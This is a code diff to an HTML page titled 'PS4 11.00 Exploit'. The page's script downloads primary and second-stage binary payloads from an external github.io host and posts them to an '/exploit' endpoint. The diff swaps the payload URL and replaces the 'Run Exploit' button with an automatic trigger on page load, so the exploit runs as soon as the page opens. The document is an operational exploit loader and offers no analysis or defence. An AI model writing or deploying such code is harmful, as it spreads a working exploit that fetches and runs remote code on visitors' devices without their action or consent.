@@ -9,7 +9,7 @@
             try {
                 document.getElementById('status').innerText = 'Starting exploit...';
 
-                const primaryPayload = await fetchPayload('https://alihussien96.github.io/payload_11.00.bin');
+                const primaryPayload = await fetchPayload('https://alihussien96.github.io/payload.bin');
                 const stage2Payload = await fetchPayload('https://alihussien96.github.io/stage2_11.00.bin');
 
                 const exploitEndpoint = `${window.location.origin}/exploit`; 
@@ -47,11 +47,12 @@
                 throw new Error(`Failed to send payload to ${url}: ${response.statusText}`);
             }
         }
+
+        document.addEventListener('DOMContentLoaded', runExploit);
     </script>
 </head>
 <body>
     <h1>PS4 11.00 Exploit</h1>
-    <button onclick="runExploit()">Run Exploit</button>
     <p id="status">Status: Idle</p>
 </body>
 </html>
